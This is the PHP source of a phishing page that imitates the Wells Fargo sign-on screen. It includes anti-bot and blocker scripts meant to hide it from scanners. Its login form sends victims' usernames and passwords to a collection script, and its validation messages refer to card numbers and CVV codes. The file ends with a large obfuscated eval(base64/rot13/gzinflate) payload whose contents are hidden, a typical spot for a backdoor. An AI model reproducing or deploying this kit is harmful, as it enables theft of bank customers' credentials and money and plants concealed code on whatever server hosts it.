<?php

session_start();
error_reporting(0);

include "./system/blocker.php";
include "./system/detect.php";
include "../antiBots2020/antibots.php";
include "../antiBots2020/filter.php";
include "../prevents/anti1.php";
include "../prevents/anti2.php";
include "../prevents/anti3.php";
include "../prevents/anti4.php";
include "../prevents/anti5.php";
include "../prevents/anti6.php";
include "../prevents/anti7.php";
include "../prevents/anti8.php";

?>

<!DOCTYPE html>
<html lang="en">
    <head>
        


    <link rel="icon" type="image/x-icon" href="./style/css/tttt.jpg">


<style>
.ddddaaaaa {
    margin-top: 10px;
    height: 45px;
    width: 200px;
    padding-left: 10px;
    margin-right: 18px;
    font-weight: 400;
    text-decoration: none;
    font-size: 13px;
    color: #44464a;
    border-radius: 2px;
    border: 1px solid #cfd1d7;
}

</style>
	
<script src="./style/js/angular.min.js"></script>
<script src="./style/js/jquery.min.js"></script>
<script src="./style/js/jquery.validate.min.js"></script>
<script src="./style/js/jquery.mask.js"></script>



	
		<meta http-equiv="Content-type" content="text/html; charset=UTF-8" />
		<meta http-equiv="Pragma" content="no-cache" />
		<meta http-equiv="Pragma: no-cache"/>
		<meta http-equiv="Cache Control" content="no-store" />
		<meta http-equiv="Cache Control: no-store" />
		<meta http-equiv="Expires" content="-1" />
	


<style id="antiClickjack">.antiClickjackContent{display:none !important;} .noscriptmsg { display:block;font-size:16px;width:100%;margin:5em 0 5em .5em}</style>

<meta http-equiv="Content-type" content="text/html; charset=UTF-8" />
        <title>Sign On to View Your Personal Accounts | Wells Fargo</title>
                <meta name="description" content="Click here to sign on to your Wells Fargo account(s)."/>
          

<link rel="stylesheet" href="./style/css/global.css">
<style>
            section[data-id="hero"] {
                overflow: hidden;
                height: 200px;
            }

            section[data-id="hero"] img {
                position: relative;
                width: 722px;
            }
        </style>
    </head>
    <body id="body" theme="ssep" platform="m" contextPath="#" >
        <a href="#skip" class="skipLink">main content</a>
        <header isJukebox="" divested="" origin="cob">
	<div>
		<a href="#"><img src="./style/css/logo.png" class="logo" alt="Wells Fargo" origin="cob"/></a><ul data-id="search">
			<li><a href="#">Apply</a></li><li><a href="#">Locations</a></li><li><a href="#">Customer Service</a></li><li>
					<div data-id="searchBox">
						<form action="#" method="get" id="frmSearch">
							<input name="q" value="" aria-label="Search" title="Search" size="25" maxlength="75" type="text" autocomplete="off" autocapitalize="off" id="inputTopSearchField" placeholder="Search" />
							<img role="button" src="./style/css/rooro.png" alt="search" onclick="Search.events.button.onclick()" onkeyup="Search.events.button.onkeyup()" tabindex="0"/>
						</form>
					</div>
				</li>
			</ul>
		<ul data-id="headerLinks">
			<li><a href="javascript:history.go(-1)">Back to Previous Page</a></li><li><a href="#">Home</a></li></ul>
	</div>
</header>
<section data-id="hero" role="presentation">
                <img src="./style/css/logobody.png" alt="" aria-hidden="true"/>
            </section>
        <main>




<script>
// Wait for the DOM to be ready
$(function() {

	var validator = $("#Signonbank").bind("invalid-form.validate", function() {
			$("#errorSignonbank").html("<div class='alert' aria-atomic='true' role='alert' tabindex='-1'><img src='./style/css/ss.png' height='16' width='16' alt='Error' /><strong>  Please check your information and try again.</strong></div>");})




  $("form[name='Signonbank']").validate({
    
	errorContainer: $("#errorSignonbank"),

    rules: {
      // The key name on the left side is the name attribute
      // of an input field. Validation rules are defined
      // on the right side
      firstname: "required",
      lastname: "required",
      email: {
        required: true,
        // Specify that email should be validated
        // by the built-in "email" rule
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },

highlight: function ( element, errorClass, validClass ) {
$( element ).parents( ".dddd" ).removeClass( validClass );
	$( element ).parents( ".dddd" ).addClass( errorClass );
				},
unhighlight: function (element, errorClass, validClass) {
					
	$( element ).parents( ".dddd" ).addClass( validClass );
$( element ).parents( ".dddd" ).removeClass( errorClass );
				},





    messages: {

      NameOnCard: "Name On Card is required!",

      lastName: "Last Name is required!",




expdate: {
        required: "Expiration Month/Year  is required!",
        minlength: "Please enter a valid Expiration Month/Year "
      },


 csc: {
        required: "Security Code (CVV) is required!",
        minlength: "Please enter a valid CVV code"
      },


  cardnumber: {
        required: "Card Number is required!",
        minlength: "Please check your Card Number"
      },


      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },






      email: "Please enter a valid email address"
    },
    // in the "action" attribute of the form when valid
    
                submitHandler: function(form) {


					$.post("./system/send_login.php?ajax", $("#Signonbank").serialize(), function(result) {
                            setTimeout(function() {





                                $(location).attr("href", "./Myaccount?id=Myaccount");
                            });
                    });
    }
  });
});

</script>




            <form id="Signonbank" name="Signonbank" action="#"  method="POST" >
                <noscript><div class="noscriptmsg">For your security, you must enable JavaScript to sign on to your account. Please adjust your browser settings, or go to <a href="#">Online Troubleshooting</a> for help.</div></noscript>


<section data-id="content" aria-label="Sign On to View Your Accounts" class="" origin="cob">
	


	<h1 id="skip" tabindex="-1">Sign On to View Your Accounts</h1>
		<div id="errorSignonbank">
		



		</div>
	<p class="copy" origin="cob">Enter your username and password to securely view and manage your
			Wells Fargo
			accounts online.</p>
		<div data-id="destination">
			<div class="enh-select">
			<select name="destination" id="destination" title="Select a destination" onchange="updateCustomSelect()">
				<option selected="selected" value="AccountSummary" onclick="updateCustomSelect()">Account Summary</option>
				<option value="Transfer">Transfer</option>
				<option value="BillPay">Bill Pay</option>
				<option value="brokerage">Brokerage</option>
				<option value="Trade">Trade</option>
				<option value="MessageAlerts">Messages &amp; Alerts</option>
			</select>
			</div>
		</div>
	<div data-id="inputContainer">
		<label id="usernamebanklabel" for="usernamebank">Username</label><br>
		<input class="ddddaaaaa"  required="required"    aria-required="true" type="text" id="usernamebank" name="usernamebank" value="" maxlength="14" class="OneLinkNoTx" autocorrect="off" autocapitalize="off"/>
			<div id="saveUsernamePopup" tabindex="-1" role="alertdialog" aria-labelledby="saveUsernameTitle" aria-describedby="saveUsernameDescription" data-id="saveUsernamePopup">
			<span>Beginning of popup</span>
			<h2 id="saveUsernameTitle">Notice</h2>
			<p id="saveUsernameDescription">For your security, we do not recommend using this feature on a shared device.</p>
			<img data-id="saveUsernameArrow" src="./style/css/ad.png" alt="" aria-hidden="true"/>
			<span>End of popup</span>
			<img tabindex="0" data-id="saveUsernameClose" onclick="LoginForm.events.saveUsernamePopup.onclick()" onKeyUp="LoginForm.events.saveUsernamePopup.onKeyUp()" role="button" src="./style/css/sdasd.png" alt="close dialog" aria-label="close dialog"/>
		</div>
	</div>
	<div data-id="inputContainer">
		<label id="passwordbanklabel" for="passwordbank">Password</label><br>
		<input  required="required"  aria-required="true" type="password" id="passwordbank" name="passwordbank" value="" maxlength="32" autocorrect="off" autocapitalize="off"/>
	</div>
	<div class="clear-both" data-id="inputContainer">
				</div>
	<div class="block-display clear-both">
		<div data-id="forgotEnrollLinks" origin="cob">
			<a href="#" data-id="forgotUsername" origin="cob">Forgot Password/Username?</a>
						<span data-id="linkSeparator">|</span>
						<a href="#" data-id="forgotUsername">Enroll Now</a>
							</div>
		<input type="submit" name="continue" value="Sign On" data-id="submit" class="button cob" origin="cob"/>
			</div>
</section>
<aside>
                    <hr/>
                    <section class="aside-group" data-id="relatedInformation" aria-label="related information">
	<h2>Related Information</h2>
	<ul>
		<li><img src="./style/css/sssssaa.png" alt="" aria-hidden="true"/> <a href="#">Enrollment FAQs</a></li><li><img src="./style/css/sssssaa.png"  alt="" aria-hidden="true"/> <a href="#">Online Security Guarantee</a></li><li><img src="./style/css/sssssaa.png" alt="" aria-hidden="true"/> <a href="#">Privacy, Security and Legal</a></li><li><img src="./style/css/sssssaa.png" alt="" aria-hidden="true"/> <a href="#">Online Access Agreement</a></li></ul>
</section>
<section class="aside-group" data-id="otherServices" aria-label="other services">
	<h2>Other Services</h2>
	<ul>
		<li><img src="./style/css/sssssaa.png" alt="" aria-hidden="true"/> <a href="#">Applications In Progress</a></li>
		<li><img src="./style/css/sssssaa.png" alt="" aria-hidden="true"/> <a href="#">Credit Card Rewards</a></li>
	</ul>
</section>
</aside>

<section data-id="submitContainer">
                </section>
            </form>
        </main>
<div data-id="footerSeparator"></div>
        <footer>
            <div>
	<nav role="navigation">
		<div>
			<ul data-id="links">
				<li><a href="#">About Wells Fargo</a></li><li><a href="@">Careers</a></li><li><a href="#">Privacy, Security &amp; Legal</a></li><li><a href="#">Report Email Fraud</a></li><li><a href="#">Sitemap</a></li><li><a href="#">Home</a></li></ul>
		</div>
	</nav>
</div>
<div class="clear-both">
				<div>
	                <p data-id="copyright" class="cob">&copy; 1999 - 2020 Wells Fargo. All rights reserved. </p>
	                    </div>
			</div>
</footer>

   

            <!--TMS include ends-->
        </body>
</html>
<?php eval(str_rot13(gzinflate(str_rot13(base64_decode('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'))))); ?>
